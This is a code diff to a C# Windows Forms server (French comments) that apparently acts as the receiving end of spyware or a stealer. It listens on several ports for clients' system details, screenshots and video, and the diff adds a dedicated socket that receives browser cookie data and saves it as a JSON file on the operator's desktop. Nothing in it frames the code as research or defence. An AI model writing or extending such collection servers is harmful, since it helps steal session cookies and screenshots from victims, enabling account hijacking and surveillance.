@@ -6,6 +6,8 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Xml;
+using Newtonsoft.Json;
 
 namespace ServerTest
 {
@@ -13,6 +15,8 @@ namespace ServerTest
     {
         private Socket textSocket;
         private Socket videoSocket;
+        private Socket cookieSocket;
+
 
         private bool isRunning;
         private TextBox infoTextBox;
@@ -21,7 +25,7 @@ namespace ServerTest
         private SqlConnection cnx;
         private string currentTime;
 
-        public Server(int port, int videoPort, TextBox textBox, Outils outilsControl)
+        public Server(int port, int videoPort,int cookiePort, TextBox textBox, Outils outilsControl)
         {
             textSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             IPEndPoint iep = new IPEndPoint(IPAddress.Parse("0.0.0.0"), port);
@@ -30,6 +34,10 @@ namespace ServerTest
             videoSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             IPEndPoint videoEndPoint = new IPEndPoint(IPAddress.Any, videoPort);
             videoSocket.Bind(videoEndPoint);
+
+            cookieSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            IPEndPoint cookieEndPoint = new IPEndPoint(IPAddress.Any, cookiePort);
+            cookieSocket.Bind(cookieEndPoint);
 
             isRunning = false;
             infoTextBox = textBox;
@@ -41,10 +49,12 @@ namespace ServerTest
             isRunning = true;
             textSocket.Listen(5);
             videoSocket.Listen(5);
+            cookieSocket.Listen(5);
             AddTextToInfoTextBox("Serveur démarré. En attente de connexions...");
 
             Task.Run(() => AcceptTextClients());
             Task.Run(() => AcceptVideoClients());
+            Task.Run(() => AcceptCookieClients());
             AddTextToInfoTextBox("Client Connected...");
         }
 
@@ -66,6 +76,15 @@ namespace ServerTest
             }
         }
 
+        private void AcceptCookieClients()
+        {
+            while (isRunning)
+            {
+                Socket clientSocket = cookieSocket.Accept();
+                Task.Run(() => ReceiveCookiesData(clientSocket));
+            }
+        }
+
         private void Communication(Socket clientSocket)
         {
             NetworkStream ns = new NetworkStream(clientSocket);
@@ -81,12 +100,12 @@ namespace ServerTest
                     string processor = reader.ReadLine();
                     string ram = reader.ReadLine();
                     string disk = reader.ReadLine();
-                    string cookies = reader.ReadLine();
+                    
 
                     string screenshotBase64 = reader.ReadLine();
                     byte[] screenshot = Convert.FromBase64String(screenshotBase64);
 
-                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot, cookies);
+                    InsertDataIntoDatabase(os, motherboard, processor, ram, disk, screenshot);
                     i++;
                     currentTime = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                     AddTextToInfoTextBox("Les Données " + i + " reçues et stockées dans la base de données à " + currentTime);
@@ -167,10 +186,10 @@ namespace ServerTest
             }
         }
 
-        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot, string cookies)
+        private void InsertDataIntoDatabase(string os, string motherboard, string processor, string ram, string disk, byte[] screenshot)
         {
-            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData, cookies, receivedAt) " +
-                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot, @cookies, @ReceivedAt)";
+            string query = "INSERT INTO receivedData1 (OS, motherboard, processeur, ram, hardDisk, captureData, receivedAt) " +
+                           "VALUES (@OS, @Motherboard, @Processor, @RAM, @Disk, @Screenshot, @ReceivedAt)";
 
             using (SqlConnection cnx = Program.GetSqlConnection())
             {
@@ -182,7 +201,6 @@ namespace ServerTest
                     command.Parameters.AddWithValue("@RAM", ram);
                     command.Parameters.AddWithValue("@Disk", disk);
                     command.Parameters.AddWithValue("@Screenshot", screenshot);
-                    command.Parameters.AddWithValue("@cookies", cookies);
                     command.Parameters.AddWithValue("@ReceivedAt", DateTime.Now);
 
                     cnx.Open();
@@ -209,6 +227,48 @@ namespace ServerTest
             textSocket.Close();
             videoSocket.Close();
             AddTextToInfoTextBox("Fermeture de la connexion");
+        }
+
+        private void ReceiveCookiesData(Socket clientSocket)
+        {
+            NetworkStream ns = new NetworkStream(clientSocket);
+            StreamReader reader = new StreamReader(ns);
+
+            try
+            {
+                // Lire les données des cookies envoyées par le client
+                string cookiesData = reader.ReadLine();
+
+                // Parsez les données JSON en une liste de dictionnaires
+                List<Dictionary<string, object>> cookiesList = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(cookiesData);
+
+                // Chemin du bureau de l'utilisateur
+                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                // Chemin complet du fichier JSON sur le bureau
+                string jsonFilePath = Path.Combine(desktopPath, "cookies_data.json");
+
+                // Convertir la liste de dictionnaires en JSON
+                string jsonData = JsonConvert.SerializeObject(cookiesList, Newtonsoft.Json.Formatting.Indented);
+
+                // Écrire les données JSON dans un fichier sur le bureau
+                File.WriteAllText(jsonFilePath, jsonData);
+
+                // Afficher un message indiquant que le fichier JSON a été enregistré avec succès
+                AddTextToInfoTextBox("Les données des cookies ont été enregistrées dans un fichier JSON sur le bureau.");
+            }
+            catch (Exception ex)
+            {
+                // En cas d'erreur, afficher un message d'erreur
+                AddTextToInfoTextBox("Erreur lors de la réception des données des cookies : " + ex.Message);
+            }
+            finally
+            {
+                // Fermer les flux et la socket client
+                reader.Close();
+                ns.Close();
+                clientSocket.Close();
+            }
         }
     }
 }
